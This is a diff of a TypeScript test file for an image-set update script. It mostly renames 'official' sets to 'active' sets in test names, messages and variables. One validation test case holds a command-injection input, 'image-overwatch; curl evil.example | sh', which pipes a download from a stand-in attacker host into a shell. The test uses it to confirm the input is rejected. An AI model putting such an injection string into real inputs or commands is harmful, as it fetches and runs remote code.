@@ -10,16 +10,16 @@ import {checkPackageEntry, compareVersions, escapedText, parseRegistry, pullRequ
 const script = path.resolve(__dirname, '../../../scripts/image-set-update.mjs');
 
 describe('validateInput', () => {
-  it('returns {packageName, version, same} when the package is an official set and the version is x.y.z', () => {
+  it('returns {packageName, version, same} when the package is an active set and the version is x.y.z', () => {
     expect(validateInput('image-overwatch', '1.3.0', customConfig, '1.2.0')).toEqual({packageName: 'image-overwatch', version: '1.3.0', same: false});
     expect(validateInput('image-reachthefinals', '10.0.0', customConfig, '1.3.0').same).toBe(false);
     expect(validateInput('image-overwatch', '1.2.0', customConfig, '1.2.0').same).toBe(true);
   });
 
   it.each([
-    ['an unknown package', 'image-unknown', 'is not an official image set'],
-    ['a legacy set', 'image-supervive', 'is not an official image set'],
-    ['the template package', 'image-set', 'is not an official image set'],
+    ['an unknown package', 'image-unknown', 'is not an active image set'],
+    ['a legacy set', 'image-supervive', 'is not an active image set'],
+    ['the template package', 'image-set', 'is not an active image set'],
     ['a package outside the image sets', 'left-pad', 'is not an image set name'],
     ['a scoped package', '@evil/image-overwatch', 'is not an image set name'],
     ['shell metacharacters', 'image-overwatch; curl evil.example | sh', 'is not an image set name'],
@@ -526,7 +526,7 @@ describe('scripts/image-set-update.mjs', () => {
       ['more than 2,000 new images', () => editEntry((entry) => {
         for (let index = 0; index < 2001; index++) entry.images.push(image(`bulk/${index}.webp`, `Bulk ${index}`));
       }), 'this update adds 2002 images; at most 2000 new images per update are accepted'],
-      ['an image in the set\'s folder (official sets are never committed)', () => {
+      ['an image in the set\'s folder (active sets are never committed)', () => {
         write('public/images/image-ow/x.png', Buffer.from('89504e470d0a1a0a0000000d49484452', 'hex'));
         git('add', '-f', 'public');
       }, 'public/images/image-ow/x.png: an image set update may not change this file'],
@@ -686,19 +686,19 @@ describe('pullRequestBody with labels', () => {
 
 describe('checkPackageEntry', () => {
   type Config = {packages: Record<string, unknown>};
-  const official = Object.entries(customConfig.packages).filter(([, custom]) => !('legacy' in custom));
+  const active = Object.entries(customConfig.packages).filter(([, custom]) => !('legacy' in custom));
 
-  it('returns tag names that match TAG_NAME, none named all or __proto__, when the official sets are read', () => {
-    expect(official.map(([name]) => name).sort()).toEqual(['image-overwatch', 'image-reachthefinals']);
-    for (const [name] of official) {
+  it('returns tag names that match TAG_NAME, none named all or __proto__, when the active sets are read', () => {
+    expect(active.map(([name]) => name).sort()).toEqual(['image-overwatch', 'image-reachthefinals']);
+    for (const [name] of active) {
       const tags = Object.keys(((imagesetConfig as Config).packages[name] as {tags: object}).tags);
       expect(tags.length, name).toBeGreaterThan(0);
       expect(tags.filter((tag) => !TAG_NAME.test(tag) || ['all', '__proto__', 'constructor', 'prototype'].includes(tag)), name).toEqual([]);
     }
   });
 
-  it('writes no error when the entry is one that prepareImages wrote for an official set', () => {
-    for (const [name, custom] of official) {
+  it('writes no error when the entry is one that prepareImages wrote for an active set', () => {
+    for (const [name, custom] of active) {
       const errors: string[] = [];
       checkPackageEntry(name, (imagesetConfig as Config).packages[name], custom, errors);
       expect(errors, name).toEqual([]);
@@ -706,7 +706,7 @@ describe('checkPackageEntry', () => {
   });
 
   it('writes a displayName, googleFont and backgroundImage error when they differ from imageset.custom.json', () => {
-    const [name, custom] = official[0];
+    const [name, custom] = active[0];
     const entry = structuredClone((imagesetConfig as Config).packages[name]) as Record<string, unknown>;
     entry.displayName = 'Renamed';
     entry.googleFont = 'Comic Neue';
